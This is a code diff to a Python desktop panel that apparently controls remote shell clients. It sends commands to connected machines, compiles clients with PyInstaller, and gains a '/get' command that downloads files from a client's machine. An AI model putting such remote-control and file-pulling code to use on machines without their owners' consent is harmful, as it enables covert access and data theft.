@@ -29,6 +29,7 @@ THREADS = {}
 USERS = {}
 CONNECTIONS = {}
 MESSAGES = {}
+FILES = {}
 
 
 def log_errors(exception):
@@ -189,7 +190,7 @@ class FrameButtonCompile(ck.CTkFrame):
 
 
 class TopLevelWindowWarning(ck.CTkToplevel):
-    def __init__(self, master, title, warnings, *args, **kwargs):
+    def __init__(self, master, title, warnings, id_=None, *args, **kwargs):
         super().__init__(*args, **kwargs)
 
         w = 400
@@ -198,6 +199,7 @@ class TopLevelWindowWarning(ck.CTkToplevel):
         self.geometry("%dx%d" % (w, h))
         self.title(title)
         self.root = master
+        self.id = id_
 
         self.frame_text = ck.CTkFrame(self)
         self.frame_text.pack(fill=tk.BOTH, expand=True)
@@ -254,6 +256,7 @@ class TopLevelWindowUserTerminal(ck.CTkToplevel):
             self.textbox.yview(tk.END)
 
         self.my_menu = tk.Menu(self, tearoff=False)
+        self.my_menu.add_command(label="Copy", command=self.copy_text)
         self.my_menu.add_command(label="Save on file", command=self.save_on_file)
         self.my_menu.add_command(label='Open history', command=self.open_history)
         self.my_menu.add_command(label="Clear", command=(lambda: self.textbox.delete(1.0, tk.END)))
@@ -265,6 +268,16 @@ class TopLevelWindowUserTerminal(ck.CTkToplevel):
     def tab(self, _):
         self.textbox.insert(tk.INSERT, " " * 4)
         return "break"
+
+    def copy_text(self):
+        try:
+            selection = self.textbox.selection_get()
+        except tk.TclError:
+            selection = ""
+        if selection:
+            self.root.clipboard_clear()
+            self.root.clipboard_append(selection)
+            self.root.update()
 
     def save_on_file(self):
         filename = fd.asksaveasfile(initialdir='./instances/shell_history', title='Save File', filetypes=(('Text Files', '*.txt'), ("All Files", "*.*")))
@@ -292,6 +305,8 @@ class TopLevelWindowUserTerminal(ck.CTkToplevel):
             message = self.root_title + '$ ' + data
             MESSAGES[self.id].append(message)
             try:
+                if data.startswith('/get '):
+                    self.root.open_toplevel_warnings(f"Get File: {self.id}", [data], id_=self.id)
                 self.user.send(data.encode())
             except OSError:
                 pass
@@ -447,10 +462,20 @@ class Application(ck.CTk):
         except Exception as e:
             log_errors(e)
 
-    def open_toplevel_warnings(self, warnings: list):
+    def open_toplevel_warnings(self, title, warnings: list, id_=None):
+        # if self.toplevel_warning is None or not self.toplevel_warning.winfo_exists():
+        #     self.toplevel_warning = TopLevelWindowWarning(self, title, warnings, id_=id_)
+        # else:
+        #     try:
+        #         self.toplevel_warning.after(50, self.toplevel_warning.lift)
+        #     except AttributeError:
+        #         pass
+        #     except Exception as e:
+        #         log_errors(e)
+        #     self.toplevel_warning.focus()
         if self.toplevel_warning is not None and self.toplevel_warning.winfo_exists():
             self.toplevel_warning.destroy()
-        self.toplevel_warning = TopLevelWindowWarning(self, "Compiler Status", warnings)
+        self.toplevel_warning = TopLevelWindowWarning(self, title, warnings, id_=id_)
 
         try:
             self.toplevel_warning.after(50, self.toplevel_warning.lift)
@@ -470,21 +495,87 @@ class Application(ck.CTk):
         self.my_menu_user.tk_popup(event.x_root, event.y_root)
 
     def hendle_data_user(self, data: bytes, user_record):
-        try:
-            message = data.decode('utf-8')
-        except UnicodeDecodeError:
-            message = data.decode('cp850', 'replace')
         global MESSAGES
-        if (
-            self.toplevel_user_terminal is not None and
-            self.toplevel_user_terminal.winfo_exists() and
-            self.toplevel_user_terminal.id == user_record
-        ):
-            self.toplevel_user_terminal.textbox.insert(tk.END, message)
-            self.toplevel_user_terminal.textbox.yview(tk.END)
 
-        if user_record in MESSAGES.keys():
-            MESSAGES[user_record].append(data)
+        last_msg = MESSAGES.get(user_record, [])[-1]
+
+        if "/get " in str(last_msg):
+            msg = str(last_msg).split("/get ", 1)
+            if len(msg) == 2:
+                filename = os.path.basename(msg[-1]).replace('\n', '')
+                self.hendle_file_user(filename, data, user_record)
+        else:
+            try:
+                message = data.decode('utf-8')
+            except UnicodeDecodeError:
+                message = data.decode('cp850', 'replace')
+
+            if user_record in MESSAGES.keys():
+                MESSAGES[user_record].append(data)
+
+            if (
+                self.toplevel_user_terminal is not None and
+                self.toplevel_user_terminal.winfo_exists() and
+                self.toplevel_user_terminal.id == user_record
+            ):
+                self.toplevel_user_terminal.textbox.insert(tk.END, message)
+                self.toplevel_user_terminal.textbox.yview(tk.END)
+
+    def hendle_file_user(self, filename, data: bytes, user_record):
+        global FILES
+
+        if user_record not in FILES.keys():
+            try:
+                expected = int(data.decode('utf-8'))
+            except ValueError:
+                expected = None
+
+            FILES[user_record] = {
+                "size_expected": expected,
+                "size_received": 0,
+                "chunks": []
+            }
+        else:
+            if FILES[user_record]["size_expected"] is None:
+                return None
+
+            if FILES[user_record]["size_expected"] == 0:
+                try:
+                    self.toplevel_warning.insert_warning(["\nFile not found!\n"])
+                except Exception as e:
+                    log_errors(e)
+                del FILES[user_record]
+                return None
+
+            FILES[user_record]["chunks"].append(data)
+            FILES[user_record]["size_received"] += len(data)
+
+            if FILES[user_record]["size_received"] == FILES[user_record]["size_expected"] and FILES[user_record]["size_expected"] is not None:
+                path = os.path.abspath('instances/files/')
+                with open(os.path.join('instances/files', filename), 'wb') as file:
+                    for chunk in FILES[user_record]["chunks"]:
+                        file.write(chunk)
+
+                if (
+                    self.toplevel_warning is not None and
+                    self.toplevel_warning.winfo_exists() and
+                    self.toplevel_warning.id == user_record
+                ):
+                    if FILES[user_record]["size_received"] < 1024:
+                        size = f"{FILES[user_record]["size_received"]} B"
+                    elif FILES[user_record]["size_received"] < 1024 * 1024:
+                        size = f"{'%.4f' % (FILES[user_record]["size_received"] / 1024)} KB"
+                    elif FILES[user_record]["size_received"] < 1024 * 1024 * 1024:
+                        size = f"{'%.4f' % (FILES[user_record]["size_received"] / 1024 / 1024)} MB"
+                    else:
+                        size = f"{'%.4f' % (FILES[user_record]["size_received"] / 1024 / 1024 / 1024)} GB"
+                    self.toplevel_warning.insert_warning([
+                        f"\nBytes expected: {FILES[user_record]['size_expected']}\n",
+                        f"\nBytes received: {FILES[user_record]['size_received']}\n",
+                        f"\nSize: {size} - filename: {filename}\n",
+                        f"\nSaved path: {path}\n"
+                    ])
+                del FILES[user_record]
 
     def del_connection(self):
         global THREADS, SOCKETS, CONNECTIONS
@@ -592,6 +683,7 @@ class Application(ck.CTk):
                     except ConnectionResetError:
                         self.del_user(id_t, c)
                         break
+
                     except Exception as e:
                         print(e)
                         break
@@ -694,7 +786,7 @@ class Application(ck.CTk):
 
         warning = f"Inicialized with compiler: {compiler}. \non working dir: {working_dir}. \non dist dir: {dist_dir}. \n"
 
-        self.open_toplevel_warnings([warning])
+        self.open_toplevel_warnings("Compiler Status", [warning])
 
         if compiler == 'PyInstaller':
             writer = (
@@ -832,9 +924,9 @@ if __name__ == '__main__':
                 client.close()
             except OSError:
                 continue
-        THREADS = {}
-        SOCKETS = {}
-        USERS = {}
+        # THREADS = {}
+        # SOCKETS = {}
+        # USERS = {}
         app.destroy()
 
     app.protocol("WM_DELETE_WINDOW", on_close)
